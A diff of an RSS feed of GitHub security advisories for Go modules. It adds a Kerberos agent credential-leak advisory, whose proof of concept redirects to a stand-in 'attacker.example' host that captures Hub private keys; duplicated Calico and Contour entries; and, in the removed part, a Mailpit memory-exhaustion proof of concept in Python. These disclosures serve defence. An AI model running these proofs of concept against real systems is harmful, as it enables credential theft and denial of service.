@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-07-02T15:58:30.932Z</updated>
+    <updated>2026-07-02T17:44:33.248Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,278 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/kerberos-io/agent/machinery] Kerberos Hub private key (X-Kerberos-Hub-PrivateKey) leaked to cross-host redirect target due to redirect-following HTTP client without CheckRedirect]]></title>
+        <id>https://github.com/advisories/GHSA-h5gx-45rj-2h5j</id>
+        <link href="https://github.com/advisories/GHSA-h5gx-45rj-2h5j"/>
+        <updated>2026-07-02T17:33:37.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The Kerberos Hub upload path sends the agent's Hub credentials in the custom <code>X-Kerberos-Hub-PrivateKey</code> and <code>X-Kerberos-Hub-PublicKey</code> request headers to the operator-configured Hub URL (<code>config.HubURI</code>). The HTTP client used (<code>&amp;http.Client{}</code> in <code>UploadKerberosHub</code>) is constructed without a <code>CheckRedirect</code> policy, so it follows HTTP redirects automatically. Go's <code>net/http</code> strips only sensitive headers (<code>Authorization</code>, <code>Cookie</code>, <code>WWW-Authenticate</code>) on a cross-host redirect; it does <strong>not</strong> strip custom headers such as <code>X-Kerberos-Hub-PrivateKey</code>. As a result, if the configured <code>HubURI</code> returns a cross-host 30x redirect, the Hub private key is forwarded verbatim to the redirect target, disclosing the credential to an unintended third party (CWE-200 / CWE-522).</p>
+<h3 id="impact">Impact</h3>
+<p>The Kerberos Hub private key (a long-lived secret authenticating the agent to Kerberos Hub) is leaked to an attacker-controlled host whenever the configured <code>HubURI</code> issues a cross-origin redirect. <code>HubURI</code> is operator configuration (<code>models.Config.HubURI</code>, JSON <code>hub_uri</code>); an open redirect on that host, a compromised/hijacked Hub deployment, a DNS/BGP hijack, or a malicious URL supplied in the agent config causes the secret to be exfiltrated. The leaked private key (together with the public key, which is forwarded in the same request) grants the attacker the agent's access to Kerberos Hub, including the ability to upload/impersonate the device.</p>
+<h3 id="vulnerable-code-fileline">Vulnerable code (file:line)</h3>
+<p><code>machinery/src/cloud/kerberos_hub.go</code> — the custom auth headers are set on a request to the operator-configurable <code>config.HubURI</code>, and the client follows redirects (no <code>CheckRedirect</code>):</p>
+<pre><code class="language-go">    // Check if we are allowed to upload to the hub with these credentials.
+    // There might be different reasons like (muted, read-only..)
+    req, err := http.NewRequest("HEAD", config.HubURI+"/storage/upload", nil)
+    if err != nil {
+        errorMessage := "UploadKerberosHub: error reading HEAD request, " + config.HubURI + "/storage: " + err.Error()
+        log.Log.Error(errorMessage)
+        return false, true, errors.New(errorMessage)
+    }
+
+    req.Header.Set("X-Kerberos-Storage-FileName", fileName)
+    req.Header.Set("X-Kerberos-Storage-Capture", "IPCamera")
+    req.Header.Set("X-Kerberos-Storage-Device", config.Key)
+    req.Header.Set("X-Kerberos-Hub-PublicKey", config.HubKey)
+    req.Header.Set("X-Kerberos-Hub-PrivateKey", config.HubPrivateKey)   // line 63
+    req.Header.Set("X-Kerberos-Hub-Region", config.S3.Region)
+
+    var client *http.Client
+    if os.Getenv("AGENT_TLS_INSECURE") == "true" {
+        tr := &amp;http.Transport{
+            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},
+        }
+        client = &amp;http.Client{Transport: tr}
+    } else {
+        client = &amp;http.Client{}   // line 73 — no CheckRedirect
+    }
+
+    resp, err := client.Do(req)
+</code></pre>
+<p><code>HubURI</code> is operator configuration:</p>
+<pre><code class="language-go">HubURI                  string       `json:"hub_uri" bson:"hub_uri"`
+</code></pre>
+<h3 id="attack-scenario">Attack scenario</h3>
+<ol>
+<li>An operator configures the agent with a <code>hub_uri</code>.</li>
+<li>That host (or a host reachable from it via redirect) responds to <code>/storage/upload</code> with <code>302 Found</code> to <code>https://attacker.example/...</code>.</li>
+<li><code>client.Do(req)</code> follows the redirect and re-sends the request, including <code>X-Kerberos-Hub-PrivateKey</code> and <code>X-Kerberos-Hub-PublicKey</code>, to <code>attacker.example</code>.</li>
+<li>The attacker captures the Hub credentials.</li>
+</ol>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>Driver built against the verbatim pinned <code>kerberos_hub.go</code> from v3.6.25. The exported <code>cloud.UploadKerberosHub</code> is invoked. Two hostnames resolve to local test servers so <code>net/http</code> treats the 302 as a genuine cross-host redirect.</p>
+<pre><code class="language-go">package main
+
+import (
+    "context"
+    "fmt"
+    "net"
+    "net/http"
+    "net/http/httptest"
+    "os"
+    "strings"
+    "sync"
+
+    "github.com/kerberos-io/agent/machinery/src/cloud"
+    "github.com/kerberos-io/agent/machinery/src/models"
+)
+
+func installResolver(mapping map[string]string) {
+    tr := http.DefaultTransport.(*http.Transport).Clone()
+    tr.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
+        host, _, _ := net.SplitHostPort(addr)
+        if target, ok := mapping[host]; ok {
+            addr = target
+        }
+        return (&amp;net.Dialer{}).DialContext(ctx, network, addr)
+    }
+    http.DefaultTransport = tr
+}
+
+func main() {
+    var mu sync.Mutex
+    var sawPriv, sawPub string
+    attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        mu.Lock()
+        sawPriv = r.Header.Get("X-Kerberos-Hub-PrivateKey")
+        sawPub = r.Header.Get("X-Kerberos-Hub-PublicKey")
+        mu.Unlock()
+        fmt.Printf("[attacker host %s] received %s %s\n", r.Host, r.Method, r.URL.Path)
+        fmt.Printf("[attacker host %s]   X-Kerberos-Hub-PrivateKey = %q\n", r.Host, r.Header.Get("X-Kerberos-Hub-PrivateKey"))
+        w.WriteHeader(200)
+    }))
+    defer attacker.Close()
+
+    legit := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        fmt.Printf("[legit host %s] received %s %s -&gt; 302 to attacker.example\n", r.Host, r.Method, r.URL.Path)
+        http.Redirect(w, r, "http://attacker.example"+r.URL.Path, http.StatusFound)
+    }))
+    defer legit.Close()
+
+    installResolver(map[string]string{
+        "legit.example":    strings.TrimPrefix(legit.URL, "http://"),
+        "attacker.example": strings.TrimPrefix(attacker.URL, "http://"),
+    })
+
+    os.MkdirAll("data/recordings", 0o755)
+    os.WriteFile("data/recordings/clip.mp4", []byte("FAKEMP4DATA"), 0o644)
+
+    cfg := &amp;models.Configuration{
+        Config: models.Config{
+            HubURI:        "http://legit.example", // operator-configurable base URL
+            HubKey:        "PUBLIC-KEY-12345",
+            HubPrivateKey: "SECRET-PRIVATE-KEY-DO-NOT-LEAK",
+            Key:           "device-key",
+        },
+    }
+    cfg.Config.S3.Region = "us-east-1"
+    _, _, _ = cloud.UploadKerberosHub(cfg, "clip.mp4")
+
+    mu.Lock()
+    defer mu.Unlock()
+    fmt.Printf("attacker host saw X-Kerberos-Hub-PrivateKey = %q\n", sawPriv)
+    fmt.Printf("attacker host saw X-Kerberos-Hub-PublicKey  = %q\n", sawPub)
+}
+</code></pre>
+<h3 id="end-to-end-reproduction">End-to-end reproduction</h3>
+<p>Pinned to <code>github.com/kerberos-io/agent/machinery@v3.6.25</code>. Verbatim <code>kerberos_hub.go</code> from that tag. Captured stdout:</p>
+<pre><code>legit (operator-configured) HubURI = http://legit.example  (-&gt; 127.0.0.1)
+attacker host (cross-origin)        = http://attacker.example  (-&gt; 127.0.0.1)
+calling cloud.UploadKerberosHub then client.Do
+[INFO] UploadKerberosHub: Uploading to Kerberos Hub (http://legit.example)
+[INFO] UploadKerberosHub: Upload started for clip.mp4
+[legit host legit.example] received HEAD /storage/upload -&gt; 302 to attacker.example
+[attacker host attacker.example] received HEAD /storage/upload
+[attacker host attacker.example]   X-Kerberos-Hub-PrivateKey = "SECRET-PRIVATE-KEY-DO-NOT-LEAK"
+[attacker host attacker.example]   X-Kerberos-Hub-PublicKey  = "PUBLIC-KEY-12345"
+[INFO] UploadKerberosHub: Upload allowed using the credentials provided (PUBLIC-KEY-12345, SECRET-PRIVATE-KEY-DO-NOT-LEAK)
+[legit host legit.example] received POST /storage/upload -&gt; 302 to attacker.example
+[attacker host attacker.example] received GET /storage/upload
+[attacker host attacker.example]   X-Kerberos-Hub-PrivateKey = "SECRET-PRIVATE-KEY-DO-NOT-LEAK"
+[attacker host attacker.example]   X-Kerberos-Hub-PublicKey  = "PUBLIC-KEY-12345"
+[INFO] UploadKerberosHub: Upload Finished, 200 OK.
+----- RESULT -----
+attacker host saw X-Kerberos-Hub-PrivateKey = "SECRET-PRIVATE-KEY-DO-NOT-LEAK"
+attacker host saw X-Kerberos-Hub-PublicKey  = "PUBLIC-KEY-12345"
+LEAK CONFIRMED: hub private key forwarded to cross-origin redirect target
+----- NEGATIVE CONTROL (same bare &amp;http.Client{}, legit.example -&gt; attacker.example) -----
+attacker saw Authorization             = ""  (stdlib strips standard auth header cross-host)
+attacker saw X-Kerberos-Hub-PrivateKey = "SECRET-PRIVATE-KEY-DO-NOT-LEAK"  (custom header NOT stripped -&gt; the bug)
+</code></pre>
+<p>The negative control on the same bare client and same cross-host redirect shows the standard <code>Authorization</code> header is stripped by <code>net/http</code>, while the custom <code>X-Kerberos-Hub-PrivateKey</code> is forwarded — confirming the leak is specific to the custom-named auth header.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Set a <code>CheckRedirect</code> policy on the client used in <code>UploadKerberosHub</code> (and the other Hub helpers in this file) that strips the <code>X-Kerberos-Hub-PrivateKey</code> / <code>X-Kerberos-Hub-PublicKey</code> headers (and any other custom auth headers) when the redirect target host differs from the original request host:</p>
+<pre><code class="language-go">checkRedirect := func(req *http.Request, via []*http.Request) error {
+    if len(via) &gt; 0 &amp;&amp; req.URL.Host != via[0].URL.Host {
+        req.Header.Del("X-Kerberos-Hub-PrivateKey")
+        req.Header.Del("X-Kerberos-Hub-PublicKey")
+    }
+    return nil
+}
+client = &amp;http.Client{CheckRedirect: checkRedirect}
+</code></pre>
+<p>A regression test should assert that after a cross-host redirect the <code>X-Kerberos-Hub-PrivateKey</code> header is absent at the final host, and that same-host redirects still carry it.</p>
+<h3 id="fix-pr">Fix PR</h3>
+<p>A fix PR implementing the <code>CheckRedirect</code> strip plus a cross-host regression test is provided to the maintainer through the advisory's private temporary fork.</p>
+<h3 id="credit">Credit</h3>
+<p>Reported by tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/kerberos-io/agent/security/advisories/GHSA-h5gx-45rj-2h5j">https://github.com/kerberos-io/agent/security/advisories/GHSA-h5gx-45rj-2h5j</a></li>
+<li><a href="https://github.com/kerberos-io/agent/commit/51f1a52e170f21c1264c6de1dc781d5b5e2a5d09">https://github.com/kerberos-io/agent/commit/51f1a52e170f21c1264c6de1dc781d5b5e2a5d09</a></li>
+<li><a href="https://github.com/advisories/GHSA-h5gx-45rj-2h5j">https://github.com/advisories/GHSA-h5gx-45rj-2h5j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h5gx-45rj-2h5j</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-02T17:33:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/projectcalico/calico] Calico Inserts Sensitive Information into Log File]]></title>
+        <id>https://github.com/advisories/GHSA-m67g-87rx-v42c</id>
+        <link href="https://github.com/advisories/GHSA-m67g-87rx-v42c"/>
+        <updated>2026-07-02T17:30:21.000Z</updated>
+        <content type="html"><![CDATA[<p>When Calico is configured with the Azure IPAM plugin, the Calico CNI binary mutates the incoming CNI configuration to attach subnet information before delegating to the IPAM plugin. After mutating, the Azure IPAM helper logs the entire unmarshaled configuration map (stdinData) at INFO level to /var/log/calico/cni/cni.log on every CNI ADD and DEL invocation — once per pod scheduled or terminated on the node. When the cluster is deployed using token-based Kubernetes authentication, this log entry contains the ServiceAccount token, client key, and certificate authority in plaintext. Any principal with read access to /var/log/calico/cni/cni.log on a node&nbsp; can read these logs and extract the credentials, which grant cluster-wide Calico networking admin privileges.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41185">https://nvd.nist.gov/vuln/detail/CVE-2026-41185</a></li>
+<li><a href="https://github.com/projectcalico/calico/pull/12502">https://github.com/projectcalico/calico/pull/12502</a></li>
+<li><a href="https://github.com/projectcalico/calico/pull/12526">https://github.com/projectcalico/calico/pull/12526</a></li>
+<li><a href="https://github.com/projectcalico/calico/pull/12527">https://github.com/projectcalico/calico/pull/12527</a></li>
+<li><a href="https://www.tigera.io/security-bulletins/tta-2026-002">https://www.tigera.io/security-bulletins/tta-2026-002</a></li>
+<li><a href="https://github.com/projectcalico/calico/commit/0ca653db0ae7400ea9fb066daa7f45c902482271">https://github.com/projectcalico/calico/commit/0ca653db0ae7400ea9fb066daa7f45c902482271</a></li>
+<li><a href="https://github.com/projectcalico/calico/commit/cd73bc2cea0f4989772f2deb93909e7cfac927e0">https://github.com/projectcalico/calico/commit/cd73bc2cea0f4989772f2deb93909e7cfac927e0</a></li>
+<li><a href="https://github.com/projectcalico/calico/commit/da9ea3a13927a35e4022b787d17a005b2157d812">https://github.com/projectcalico/calico/commit/da9ea3a13927a35e4022b787d17a005b2157d812</a></li>
+<li><a href="https://github.com/advisories/GHSA-m67g-87rx-v42c">https://github.com/advisories/GHSA-m67g-87rx-v42c</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m67g-87rx-v42c</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-28T18:30:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/projectcalico/calico] Calico Inserts Sensitive Information into Log File]]></title>
+        <id>https://github.com/advisories/GHSA-m67g-87rx-v42c</id>
+        <link href="https://github.com/advisories/GHSA-m67g-87rx-v42c"/>
+        <updated>2026-07-02T17:30:21.000Z</updated>
+        <content type="html"><![CDATA[<p>When Calico is configured with the Azure IPAM plugin, the Calico CNI binary mutates the incoming CNI configuration to attach subnet information before delegating to the IPAM plugin. After mutating, the Azure IPAM helper logs the entire unmarshaled configuration map (stdinData) at INFO level to /var/log/calico/cni/cni.log on every CNI ADD and DEL invocation — once per pod scheduled or terminated on the node. When the cluster is deployed using token-based Kubernetes authentication, this log entry contains the ServiceAccount token, client key, and certificate authority in plaintext. Any principal with read access to /var/log/calico/cni/cni.log on a node&nbsp; can read these logs and extract the credentials, which grant cluster-wide Calico networking admin privileges.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41185">https://nvd.nist.gov/vuln/detail/CVE-2026-41185</a></li>
+<li><a href="https://github.com/projectcalico/calico/pull/12502">https://github.com/projectcalico/calico/pull/12502</a></li>
+<li><a href="https://github.com/projectcalico/calico/pull/12526">https://github.com/projectcalico/calico/pull/12526</a></li>
+<li><a href="https://github.com/projectcalico/calico/pull/12527">https://github.com/projectcalico/calico/pull/12527</a></li>
+<li><a href="https://www.tigera.io/security-bulletins/tta-2026-002">https://www.tigera.io/security-bulletins/tta-2026-002</a></li>
+<li><a href="https://github.com/projectcalico/calico/commit/0ca653db0ae7400ea9fb066daa7f45c902482271">https://github.com/projectcalico/calico/commit/0ca653db0ae7400ea9fb066daa7f45c902482271</a></li>
+<li><a href="https://github.com/projectcalico/calico/commit/cd73bc2cea0f4989772f2deb93909e7cfac927e0">https://github.com/projectcalico/calico/commit/cd73bc2cea0f4989772f2deb93909e7cfac927e0</a></li>
+<li><a href="https://github.com/projectcalico/calico/commit/da9ea3a13927a35e4022b787d17a005b2157d812">https://github.com/projectcalico/calico/commit/da9ea3a13927a35e4022b787d17a005b2157d812</a></li>
+<li><a href="https://github.com/advisories/GHSA-m67g-87rx-v42c">https://github.com/advisories/GHSA-m67g-87rx-v42c</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m67g-87rx-v42c</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-28T18:30:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/projectcontour/contour] Contour has Improper JWT Verification for Non-SNI Requests on Virtual Hosts with Fallback Certificate Enabled]]></title>
+        <id>https://github.com/advisories/GHSA-g3xr-5w5j-w4q4</id>
+        <link href="https://github.com/advisories/GHSA-g3xr-5w5j-w4q4"/>
+        <updated>2026-07-02T17:15:23.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>When an <code>HTTPProxy</code> is configured with incompatible combination of both <code>.spec.virtualhost.tls.enableFallbackCertificate: true</code> and <code>.spec.virtualhost.jwtProviders</code>, Contour does not reject the configuration. Consequently, requests from clients that do not send TLS SNI or send an unrecognized SNI (one that does not match any <code>HTTPProxy</code> FQDN) bypass configured JWT verification and are proxied to upstream services without a valid token.</p>
+<p>To list all <code>HTTPProxies</code> with this invalid configuration, run</p>
+<pre><code class="language-bash">kubectl get httpproxies -A -o json | jq -r '
+  .items[]
+  | select(.spec.virtualhost | .tls.enableFallbackCertificate and .jwtProviders)
+  | "Invalid HTTPProxy found: \(.metadata.namespace)/\(.metadata.name)"
+'
+</code></pre>
+<h3 id="patches">Patches</h3>
+<p>This issue is fixed in Contour v1.33.5. Contour now rejects and marks invalid any <code>HTTPProxy</code> resources that combine <code>.spec.virtualhost.tls.enableFallbackCertificate: true</code> with <code>.spec.virtualhost.jwtProviders</code>. Affected resources will receive a status  condition with the error reason <code>TLSIncompatibleFeatures</code>.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Do not enable <code>.spec.virtualhost.tls.enableFallbackCertificate</code> on <code>HTTPProxy</code> resources that also define <code>.spec.virtualhost.jwtProviders</code>. Remove one of the two settings to avoid the invalid configuration.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>Contour fallback certificate documentation: <a href="https://projectcontour.io/docs/main/config/tls-termination/#fallback-certificate">https://projectcontour.io/docs/main/config/tls-termination/#fallback-certificate</a></li>
+<li>Contour JWT verification documentation: <a href="https://projectcontour.io/docs/main/config/jwt-verification/">https://projectcontour.io/docs/main/config/jwt-verification/</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/projectcontour/contour/security/advisories/GHSA-g3xr-5w5j-w4q4">https://github.com/projectcontour/contour/security/advisories/GHSA-g3xr-5w5j-w4q4</a></li>
+<li><a href="https://github.com/advisories/GHSA-g3xr-5w5j-w4q4">https://github.com/advisories/GHSA-g3xr-5w5j-w4q4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g3xr-5w5j-w4q4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-02T17:15:20.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/gofiber/fiber/v2] GoFiber Vulnerable to X-Real-IP Spoofing via Header.Add() in BalancerForward]]></title>
         <id>https://github.com/advisories/GHSA-gcfq-8gqf-4876</id>
@@ -1353,318 +1625,5 @@ make control
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-07-01T20:57:49.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/axllent/mailpit] Mailpit: Sibling-endpoint memory-exhaustion DoS via unbounded JSON body on /api/v1/messages, /api/v1/tags, and /api/v1/message/{id}/release (incomplete fix of GHSA-fpxj-m5q8-fphw)]]></title>
-        <id>https://github.com/advisories/GHSA-28pq-6qxg-wg5r</id>
-        <link href="https://github.com/advisories/GHSA-28pq-6qxg-wg5r"/>
-        <updated>2026-07-01T20:56:11.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The fix for GHSA-fpxj-m5q8-fphw (CVE-2026-45710, "Mailpit: Set a default 50MB p/m limit to prevent DoS via unlimited SMTP DATA and /api/v1/send body sizes") wrapped only <code>POST /api/v1/send</code> with <code>http.MaxBytesReader</code>. The four other Mailpit JSON-body API endpoints  <code>PUT /api/v1/messages</code> (SetReadStatus), <code>DELETE /api/v1/messages</code> (DeleteMessages), <code>PUT /api/v1/tags</code> (SetMessageTags), and <code>POST /api/v1/message/{id}/release</code> (ReleaseMessage)  still call <code>json.NewDecoder(r.Body)</code> directly with no body-size cap and remain reachable unauthenticated in the default <code>docker run axllent/mailpit:latest</code> deploy. An unauthenticated remote attacker can post a multi-million-element <code>IDs</code> slice and drive RSS from ~25 MiB baseline to ~450 MiB per 16 MB request body. Repeating across multiple connections accumulates the same per-request amplification per process.</p>
-<h3 id="affected-versions">Affected versions</h3>
-<ul>
-<li>Mailpit at HEAD <code>67a7ca83ff759082d2b86dda07eb5bb3dad404e0</code> (v1.30.0, 2026-05-14).</li>
-<li>All versions <code>&lt;= v1.30.0</code> (the release that shipped the GHSA-fpxj fix). Versions <code>&lt; v1.30.0</code> are vulnerable to the original GHSA-fpxj on <code>/api/v1/send</code>; version <code>v1.30.0</code> carries the sibling-endpoint gap described here.</li>
-</ul>
-<h3 id="privilege-required">Privilege required</h3>
-<p>None in default deploy (no <code>--ui-auth</code>, no <code>--smtp-auth</code>). The four endpoints share the same <code>middleWareFunc</code> wrapper as the original GHSA-fpxj target, so the same default-no-auth threat model applies. With <code>--ui-auth=user:pass</code> configured, the same primitive is post-auth — still useful since UI-auth Mailpit deployments commonly run on internal ops subnets where one stolen UI credential pivots into an RSS-exhaustion vector against the same host.</p>
-<h3 id="the-incomplete-fix">The incomplete fix</h3>
-<p>Commit <code>136bdde</code> ("Security: Set a default 50MB p/m limit to prevent DoS via unlimited SMTP DATA and /api/v1/send body sizes (GHSA-fpxj-m5q8-fphw)", 2026-05-12) added the <code>MaxBytesReader</code> wrap in exactly one place:</p>
-<pre><code class="language-go">// server/apiv1/send.go:45-48
-if config.MaxMessageSize &gt; 0 {
-    r.Body = http.MaxBytesReader(w, r.Body, int64(config.MaxMessageSize)*1024*1024)
-}
-
-decoder := json.NewDecoder(r.Body)
-</code></pre>
-<p>The sibling JSON-body handlers were not updated. Side-by-side at HEAD <code>67a7ca8</code>:</p>
-<table>
-<thead>
-<tr>
-<th>File</th>
-<th>Function</th>
-<th><code>MaxBytesReader</code>?</th>
-<th>Unauth in default deploy?</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>server/apiv1/send.go:45-48</code> (<code>SendMessageHandler</code>)</td>
-<td>POST <code>/api/v1/send</code></td>
-<td>YES (50 MB)</td>
-<td>YES (via <code>sendAPIAuthMiddleware</code> falling back to <code>middleWareFunc</code>)</td>
-</tr>
-<tr>
-<td><code>server/apiv1/messages.go:107</code> (<code>SetReadStatus</code>)</td>
-<td>PUT <code>/api/v1/messages</code></td>
-<td>NO</td>
-<td>YES</td>
-</tr>
-<tr>
-<td><code>server/apiv1/messages.go:187</code> (<code>DeleteMessages</code>)</td>
-<td>DELETE <code>/api/v1/messages</code></td>
-<td>NO</td>
-<td>YES</td>
-</tr>
-<tr>
-<td><code>server/apiv1/tags.go:54</code> (<code>SetMessageTags</code>)</td>
-<td>PUT <code>/api/v1/tags</code></td>
-<td>NO</td>
-<td>YES</td>
-</tr>
-<tr>
-<td><code>server/apiv1/release.go:55</code> (<code>ReleaseMessage</code>)</td>
-<td>POST <code>/api/v1/message/{id}/release</code></td>
-<td>NO</td>
-<td>YES</td>
-</tr>
-</tbody></table>
-<p>The four sibling handlers all share the shape:</p>
-<pre><code class="language-go">// server/apiv1/messages.go:107-115 (SetReadStatus)
-decoder := json.NewDecoder(r.Body)
-
-var data struct {
-    Read   bool
-    IDs    []string
-    Search string
-}
-
-err := decoder.Decode(&amp;data)
-</code></pre>
-<p>No <code>MaxBytesReader</code>, no body-size cap, no <code>r.Header.Get("Content-Length")</code> check. The <code>json.NewDecoder</code> streams the body but each <code>"x"</code> element materialises as a separate Go <code>string</code> plus slice-header overhead, so the unmarshalled <code>[]string</code> slice for <code>IDs</code> grows roughly linearly with attacker payload size.</p>
-<h3 id="vulnerable-code">Vulnerable code</h3>
-<p><code>server/apiv1/messages.go:107</code>:</p>
-<pre><code class="language-go">func SetReadStatus(w http.ResponseWriter, r *http.Request) {
-    decoder := json.NewDecoder(r.Body)
-
-    var data struct {
-        Read   bool
-        IDs    []string
-        Search string
-    }
-
-    err := decoder.Decode(&amp;data)
-    if err != nil {
-        httpError(w, err.Error())
-        return
-    }
-    // ...
-</code></pre>
-<p>Three other handlers (<code>DeleteMessages</code>, <code>SetMessageTags</code>, <code>ReleaseMessage</code>) match the same shape.</p>
-<h3 id="reachability-chain-default-deploy">Reachability chain (default deploy)</h3>
-<pre><code>Listen()                                  # config/config.go HTTPListen = "[::]:8025"
-   ↓
-HTTP server                               # server/server.go:177-186
-   ↓
-middleWareFunc(apiv1.SetReadStatus)       # server/server.go:178 — auth bypassed when UICredentials == nil
-   ↓
-SetReadStatus                             # server/apiv1/messages.go:87
-   ↓
-json.NewDecoder(r.Body).Decode(&amp;data)    # no MaxBytesReader; allocates 4M Go strings + slice for {"IDs":["x",...]}
-   ↓
-RSS grows ~28x relative to payload size
-</code></pre>
-<p><code>config/config.go</code>'s <code>MaxMessageSize</code> field (added by 136bdde) exists and is parsed from <code>--max-message-size</code> (default 50 MB), but it is checked only in <code>server/apiv1/send.go</code>. The four sibling handlers never consult it.</p>
-<h3 id="reproduction-e2e-against-axllentmailpitlatest-v1300">Reproduction (E2E against <code>axllent/mailpit:latest</code> v1.30.0)</h3>
-<pre><code class="language-bash"># 1) start mailpit with defaults (no --ui-auth, no --smtp-auth)
-docker run --name mailpit-test -d -p 18025:8025 axllent/mailpit:latest
-
-# 2) baseline RSS
-docker stats mailpit-test --no-stream --format '{{.MemUsage}}'
-# → 8.473MiB / 5.772GiB
-
-# 3) trigger
-python3 - &lt;&lt;'PY'
-import socket
-N = 4_000_000
-prefix = b'{"Read": true, "IDs": ['
-items  = b'"x"' + (b',"x"' * (N - 1))
-suffix = b']}'
-clen   = len(prefix) + len(items) + len(suffix)
-s = socket.create_connection(("localhost", 18025), timeout=300)
-s.sendall(
-    b"PUT /api/v1/messages HTTP/1.1\r\n"
-    b"Host: localhost:18025\r\n"
-    b"Content-Type: application/json\r\n"
-    b"Content-Length: " + str(clen).encode() + b"\r\n"
-    b"Connection: close\r\n\r\n")
-s.sendall(prefix)
-rem = items
-while rem:
-    s.sendall(rem[:1024*1024]); rem = rem[1024*1024:]
-s.sendall(suffix)
-s.close()
-PY
-
-# 4) post-PoC RSS
-docker stats mailpit-test --no-stream --format '{{.MemUsage}}'
-# → 455.8MiB / 5.772GiB
-</code></pre>
-<p>Observed: a single 16 MB JSON body drove Mailpit RSS from 8.473 MiB to 455.8 MiB (+447 MiB, ~28× amplification). Memory is not freed between requests; repeating the PoC over multiple TCP connections sums per-process until the operator restarts the container or the host memory pressure regime terminates it.</p>
-<p>The same primitive reproduces on <code>DELETE /api/v1/messages</code>, <code>PUT /api/v1/tags</code>, and <code>POST /api/v1/message/{any-id}/release</code> with identical body shapes; each of the four endpoints individually reproduces the same amplification.</p>
-<h3 id="impact">Impact</h3>
-<ul>
-<li><strong>Pre-auth remote memory-exhaustion DoS.</strong> Default-deploy Mailpit (the deployment shape the README documents for dev/CI use) is reachable unauthenticated on <code>[::]:8025</code>. A single TCP connection sending one ~100 MB JSON <code>IDs</code> body drives RSS to ~2.8 GB. Multiple concurrent connections compound the per-process RSS growth. Class-and-severity match the parent CVE-2026-45710.</li>
-<li><strong>Disk amplification (secondary).</strong> The <code>IDs</code> slice itself is not persisted to SQLite (unlike the parent GHSA-fpxj message-body path), so disk pressure is limited to whatever the handler does downstream. For <code>SetReadStatus</code>, the slice is iterated and an UPDATE is issued for each id; with 4M entries the per-call work is also linear in <code>len(ids)</code>.</li>
-<li><strong>Same threat model as the parent.</strong> The maintainer chose 50 MB as the default cap for <code>/api/v1/send</code> to bound the worst case there. Without the same cap on these sibling endpoints, the per-process worst-case is unbounded.</li>
-</ul>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>Apply the same <code>MaxBytesReader</code> pattern already proven on <code>send.go</code> to every JSON-body handler. Concretely, wrap each of the four sibling sites:</p>
-<pre><code class="language-go">// server/apiv1/messages.go:107  (SetReadStatus)
-if config.MaxMessageSize &gt; 0 {
-    r.Body = http.MaxBytesReader(w, r.Body, int64(config.MaxMessageSize)*1024*1024)
-}
-decoder := json.NewDecoder(r.Body)
-
-// server/apiv1/messages.go:187  (DeleteMessages) — same wrap
-// server/apiv1/tags.go:54       (SetMessageTags) — same wrap
-// server/apiv1/release.go:55    (ReleaseMessage)  — same wrap
-</code></pre>
-<p>A cleaner shape is to factor the cap into the existing <code>middleWareFunc</code> wrapper in <code>server/server.go</code>, so every API handler that is not an upload-style endpoint inherits the cap by default. </p>
-<h3 id="credit">Credit</h3>
-<p>Reported by tonghuaroot.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/axllent/mailpit/security/advisories/GHSA-28pq-6qxg-wg5r">https://github.com/axllent/mailpit/security/advisories/GHSA-28pq-6qxg-wg5r</a></li>
